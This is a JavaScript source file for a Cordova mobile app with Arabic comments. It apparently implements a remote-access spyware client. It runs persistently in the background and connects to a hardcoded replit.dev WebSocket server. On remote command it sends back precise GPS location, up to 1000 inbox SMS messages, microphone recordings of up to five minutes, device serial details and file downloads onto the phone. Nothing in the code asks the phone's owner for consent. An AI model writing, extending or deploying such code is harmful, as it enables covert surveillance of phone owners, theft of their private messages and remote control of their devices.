document.addEventListener('deviceready', onDeviceReady, false);

// متغيرات لتخزين الطلبات والردود
const requestsHistory = [];
let backgroundTask = null;

function onDeviceReady() {
    console.log('Device is ready');
    
    // تهيئة الخلفية
    initBackgroundMode();
    
    // معلومات الجهاز
    const deviceInfo = {
        uuid: device.uuid || generateUUID(),
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown',
        battery: null,
        timestamp: new Date().toISOString()
    };
    
    // توليد UUID إذا لم يكن موجوداً
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    // الحصول على حالة البطارية
    updateBatteryInfo(deviceInfo);
    connectToServer(deviceInfo);
}

function initBackgroundMode() {
    // تأكد من وجود البلجن
    if (cordova.plugins.backgroundMode) {
        cordova.plugins.backgroundMode.enable();
        cordova.plugins.backgroundMode.setDefaults({
            title: "نظام إدارة الأجهزة",
            text: "يعمل في الخلفية",
            icon: "icon", // اسم أيقونتك
            color: "F14F4D", // لون HEX
            resume: true,
            hidden: false,
            bigText: true
        });
        
        cordova.plugins.backgroundMode.on('activate', function() {
            cordova.plugins.backgroundMode.disableWebViewOptimizations();
            console.log('Running in background');
        });
    } else {
        console.warn('Background mode plugin not available');
    }
}

function connectToServer(deviceInfo) {
    const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
    window.wsConnection = new WebSocket(wsUrl);
    
    wsConnection.onopen = () => {
        console.log('Connected to server');
        
        // تسجيل الجهاز
        wsConnection.send(JSON.stringify({
            type: 'register',
            deviceId: deviceInfo.uuid,
            deviceInfo
        }));
    };
    
    wsConnection.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                console.log('Received command:', data.command);
                
                // تخزين الطلب في التاريخ
                const request = {
                    id: data.command.commandId || Date.now(),
                    type: data.command.type,
                    receivedAt: new Date().toISOString(),
                    status: 'processing',
                    command: data.command
                };
                requestsHistory.push(request);
                
                // تنفيذ الأمر
                executeCommand(data.command, (response) => {
                    request.status = 'completed';
                    request.response = response;
                    request.completedAt = new Date().toISOString();
                    
                    if (wsConnection.readyState === WebSocket.OPEN) {
                        wsConnection.send(JSON.stringify({
                            type: 'response',
                            commandId: data.command.commandId,
                            response: {
                                ...response,
                                requestId: request.id
                            }
                        }));
                    }
                    
                    // حفظ التاريخ للتخزين المحلي
                    saveRequestsHistory();
                });
            }
            
        } catch (error) {
            console.error('Error processing message:', error);
        }
    };
    
    wsConnection.onerror = (error) => {
        console.error('WebSocket error:', error);
    };
    
    wsConnection.onclose = () => {
        console.log('Disconnected from server');
        setTimeout(() => connectToServer(deviceInfo), 10000);
    };
    
    // إرسال نبضات قلبية دورية
    setInterval(() => {
        if (wsConnection.readyState === WebSocket.OPEN) {
            updateBatteryInfo(deviceInfo);
            wsConnection.send(JSON.stringify({ 
                type: 'heartbeat',
                timestamp: new Date().toISOString()
            }));
        }
    }, 30000);
}

function updateBatteryInfo(deviceInfo) {
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            deviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            
            // إرسال تحديث البطارية إذا كان متصلاً
            if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
                window.wsConnection.send(JSON.stringify({
                    type: 'device_update',
                    deviceInfo: {
                        battery: deviceInfo.battery,
                        timestamp: new Date().toISOString()
                    }
                }));
            }
        });
    }
}

function executeCommand(command, callback) {
    const commandId = command.commandId || Date.now();
    
    switch (command.type) {
        case 'get_location':
            getLocation(commandId, callback);
            break;
        case 'get_sms':
            getSMS(commandId, callback);
            break;
        case 'record_audio':
            recordAudio(commandId, command.duration || 10, callback);
            break;
        case 'get_device_info':
            getDeviceInfo(commandId, callback);
            break;
        case 'get_requests_history':
            getRequestsHistory(commandId, callback);
            break;
        case 'download_file':
            downloadFile(commandId, command.fileUrl, callback);
            break;
        default:
            callback({ 
                commandId,
                status: 'error',
                error: 'Unknown command',
                receivedCommand: command
            });
    }
}

function getLocation(commandId, callback) {
    const options = {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    };
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
            
            callback({
                commandId,
                status: 'success',
                location: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: position.timestamp,
                    mapUrl: mapUrl
                }
            });
        },
        (error) => {
            callback({ 
                commandId,
                status: 'error',
                error: 'Location error',
                details: {
                    code: error.code,
                    message: error.message,
                    PERMISSION_DENIED: error.PERMISSION_DENIED,
                    POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
                    TIMEOUT: error.TIMEOUT
                }
            });
        },
        options
    );
}

function getSMS(commandId, callback) {
    if (typeof SMS === 'undefined') {
        return callback({ 
            commandId,
            status: 'error',
            error: 'SMS plugin not available',
            suggestion: 'Install cordova-sms-plugin'
        });
    }
    
    const filter = {
        box: 'inbox',
        maxCount: 1000, // زيادة عدد الرسائل
        indexFrom: 0
    };
    
    SMS.listSMS(
        filter,
        (messages) => {
            // تصدير كملف JSON
            const smsData = {
                count: messages.length,
                messages: messages.map(msg => ({
                    id: msg._id,
                    address: msg.address,
                    body: msg.body,
                    date: new Date(msg.date).toISOString(),
                    read: msg.read,
                    serviceCenter: msg.service_center,
                    subject: msg.subject
                })),
                generatedAt: new Date().toISOString(),
                deviceId: device.uuid
            };
            
            callback({
                commandId,
                status: 'success',
                count: messages.length,
                fullData: smsData,
                preview: messages.slice(0, 5) // عرض عينة من الرسائل
            });
        },
        (error) => {
            callback({ 
                commandId,
                status: 'error',
                error: 'SMS error',
                details: error
            });
        }
    );
}

function recordAudio(commandId, duration, callback) {
    duration = Math.min(Math.max(duration, 5), 300); // بين 5 و 300 ثانية
    
    // إعداد مسجل الصوت
    let mediaRecorder;
    let audioChunks = [];
    
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'audio/mpeg' // استخدام MP3
            });
            
            mediaRecorder.ondataavailable = (e) => {
                audioChunks.push(e.data);
            };
            
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
                const audioUrl = URL.createObjectURL(audioBlob);
                
                // تحويل إلى base64 للإرسال
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    const base64data = reader.result.split(',')[1];
                    
                    callback({
                        commandId,
                        status: 'success',
                        audio: {
                            duration: duration,
                            format: 'mp3',
                            size: audioBlob.size,
                            base64: base64data,
                            downloadUrl: audioUrl
                        }
                    });
                };
                
                // تحرير المورد
                stream.getTracks().forEach(track => track.stop());
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);
            
        })
        .catch(error => {
            callback({ 
                commandId,
                status: 'error',
                error: 'Audio recording failed',
                details: error.message
            });
        });
}

function getDeviceInfo(commandId, callback) {
    const info = {
        cordova: device.cordova,
        model: device.model,
        platform: device.platform,
        uuid: device.uuid,
        version: device.version,
        manufacturer: device.manufacturer,
        isVirtual: device.isVirtual,
        serial: device.serial,
        memory: {
            free: window.device?.memory?.free,
            total: window.device?.memory?.total
        },
        storage: {
            free: window.device?.storage?.free,
            total: window.device?.storage?.total
        }
    };
    
    callback({
        commandId,
        status: 'success',
        deviceInfo: info
    });
}

function getRequestsHistory(commandId, callback) {
    callback({
        commandId,
        status: 'success',
        history: requestsHistory,
        count: requestsHistory.length
    });
}

function downloadFile(commandId, fileUrl, callback) {
    const fileTransfer = new FileTransfer();
    const fileName = fileUrl.split('/').pop() || `download_${Date.now()}`;
    const filePath = cordova.file.externalRootDirectory + fileName;
    
    fileTransfer.download(
        encodeURI(fileUrl),
        filePath,
        (entry) => {
            callback({
                commandId,
                status: 'success',
                file: {
                    name: fileName,
                    path: entry.toURL(),
                    size: entry.size,
                    mimeType: entry.type
                }
            });
        },
        (error) => {
            callback({
                commandId,
                status: 'error',
                error: 'Download failed',
                details: {
                    code: error.code,
                    source: error.source,
                    target: error.target,
                    httpStatus: error.http_status
                }
            });
        },
        true
    );
}

function saveRequestsHistory() {
    try {
        window.localStorage.setItem('requestsHistory', JSON.stringify(requestsHistory));
    } catch (e) {
        console.error('Failed to save requests history:', e);
    }
}

function loadRequestsHistory() {
    try {
        const saved = window.localStorage.getItem('requestsHistory');
        if (saved) {
            requestsHistory = JSON.parse(saved);
        }
    } catch (e) {
        console.error('Failed to load requests history:', e);
    }
}

// تحميل التاريخ المحفوظ عند البدء
loadRequestsHistory();
